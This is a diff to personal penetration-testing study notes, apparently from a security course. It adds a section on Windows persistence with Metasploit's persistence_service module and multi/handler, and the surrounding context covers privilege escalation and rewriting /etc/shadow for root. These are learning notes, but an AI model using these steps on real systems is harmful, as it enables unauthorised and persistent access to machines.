@@ -361,7 +361,7 @@ Privilege Escalation
 5.sessions set up in msfconsole
 
 	msf6 > sessions 1
-			 > sessions -K (kill session)
+	     > sessions -K (kill session)
 
 5.Windows Access Tokens
 
@@ -709,6 +709,30 @@ Linux command can be used to identify files with the write permission applied fo
 #nano /etc/shadow
 Paste that in root user password > gain root access
 __________________________________________________________________________________________________________________________________
+Windows Persistence_service using with meterpreter
+-------------------------------------------
+
+1. Establishing persistence on a system does not interfere with the functionality of the operating system. (False)
+2. You require elevated privileges in order to establish persistence on a Windows system. (True)
+
+You already need to have one administrative session  (with rejetto or something).
+
+msf6> search persistence_service
+    > set LPORT 6666 ( LPORT need to change bc some port cannot be used but need to use same payload)
+    > set session 1
+
+Each 5 seconds, the persistence service will upload the payload if it is disconnected.
+It have persistence, so kill the session and connect again with multi/handler (But necessary to remember LPORT and payload)
+
+msf6> session -K 1
+msf6> use multi/handler
+    > set LPORT ....
+    > set payload
+    > run
+__________________________________________________________________________________________________________________________________
+
+    
+    
 
 
 
